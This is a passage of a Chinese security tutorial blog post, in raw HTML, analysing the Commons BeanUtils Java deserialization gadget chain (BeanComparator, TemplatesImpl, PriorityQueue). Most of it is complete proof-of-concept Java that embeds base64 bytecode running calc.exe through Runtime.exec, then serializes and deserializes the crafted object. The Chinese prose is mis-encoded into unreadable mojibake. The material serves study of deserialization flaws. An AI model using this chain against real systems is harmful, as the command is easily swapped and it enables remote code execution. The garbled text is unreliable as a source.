class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBean</span> &#123;<br>   <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;xsw6a&quot;</span>;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBeanTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBean</span>(), <span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051440903.png" alt="QQæˆªå›¾20220305144036"></p><h2 id="BeanComparator-compare"><a href="#BeanComparator-compare" class="headerlink" title="BeanComparator#compare"></a>BeanComparator#compare</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446886.png" alt="QQæˆªå›¾20220305144522"></p><p>è¯¥ç±»ç»§æ‰¿äº†<strong>Comparator</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051446211.png" alt="QQæˆªå›¾20220305144607"></p><p>å¦‚æœpropertyä¸ºç©ºåˆ™æ¯”è¾ƒä¼ å…¥çš„å‚æ•°ï¼Œå¦åˆ™è¿›å…¥tryï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªJavaBeançš„getteræ–¹æ³•ã€‚è¿™æ—¶å€™å°±æƒ³åˆ°äº†ã€‚ä¹‹å‰åˆ©ç”¨çš„TemplatesImplåŠ è½½æ¶æ„ç±»ä¸­çš„getOutputPropertiesï¼Œåˆšå¥½æ»¡è¶³getterçš„å®šä¹‰ã€‚<br>æˆ‘ä»¬å¯ä»¥å…·ä½“æ¥çœ‹ä¸€ä¸‹ä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051456435.png" alt="QQæˆªå›¾20220305145619"></p><p>é‚£ä¹ˆä¹Ÿå°±è¯´æˆ‘ä»¬å¦‚æœæ„é€ **PropertyUtils.getProperty( new TemplatesImpl(), OutputProperties )**å°±å¯ä»¥æˆåŠŸåŠ è½½æ¶æ„ç±»ã€‚<br>å…ˆä¸æ·»åŠ ååºåˆ—åŒ–å’Œåºåˆ—åŒ–ã€‚æ¥å®‰æ’ä¸€ä¸ªã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTestOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051727342.png" alt="QQæˆªå›¾20220305172653"></p><h2 id="æ·»åŠ ä¸Šåºåˆ—åŒ–"><a href="#æ·»åŠ ä¸Šåºåˆ—åŒ–" class="headerlink" title="æ·»åŠ ä¸Šåºåˆ—åŒ–"></a>æ·»åŠ ä¸Šåºåˆ—åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CbTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, NoSuchFieldException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,templates);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹1"><a href="#æ³¨æ„ç‚¹1" class="headerlink" title="æ³¨æ„ç‚¹1"></a>æ³¨æ„ç‚¹1</h2><p>è¿™é‡Œç›¸æ¯”ä¸cc2æ¥è¯´ï¼Œpç¥è¿™é‡Œæ·»åŠ ä¸Šäº†<strong>PriorityQueue priorityQueue &#x3D; new PriorityQueue(2,beanComparator);<strong>æœ¬äººç›´æ¥æŒ‰ç…§cc2çš„ç†è§£å»èµ°,åé¢è·Ÿè¿›å»çœ‹äº†çœ‹ã€‚æ‰å‘ç°ã€‚å½“ä»£ç è·Ÿè¿›åˆ°ã€‚</strong>PriorityQueue#siftUpUsingComparator</strong>è¿™æ—¶å€™æç„¶å¤§æ‚Ÿï¼Œæˆ‘äººéƒ½å‚»äº†ï¼Œç»§ç»­è·Ÿè¿›ä»–ä¼šç›´æ¥è·³è½¬åˆ°<strong>BeanComparator#compare</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819928.png" alt="QQæˆªå›¾20220305173004"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051819921.png" alt="QQæˆªå›¾20220305173013"></p><p>ä½†æ˜¯æˆ‘ä»¬è¦æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œå°±å¿…é¡»æ˜¯çš„<strong>property</strong>ä¸ä¸ºç©ºï¼Œå¯ä»¥é€šè¿‡åå°„ç ´å±€ã€‚<code>property=outputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span 